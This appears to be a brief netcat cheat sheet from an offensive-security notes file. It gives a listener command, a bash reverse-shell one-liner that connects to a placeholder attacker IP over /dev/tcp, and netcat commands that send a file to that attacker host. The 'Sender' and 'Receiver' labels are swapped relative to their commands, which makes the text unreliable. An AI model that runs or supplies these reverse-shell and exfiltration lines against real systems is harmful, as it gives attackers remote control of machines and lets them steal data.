
---

### 📁 `tools/netcat-basics.md`

```markdown
# 🛠️ Netcat (nc) Basics – zerodaywarrior

## Listener Mode
```bash
nc -lvnp 4444
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
# Sender
nc -lvnp 1234 > received.txt

# Receiver
nc <attacker-ip> 1234 < sendme.txt
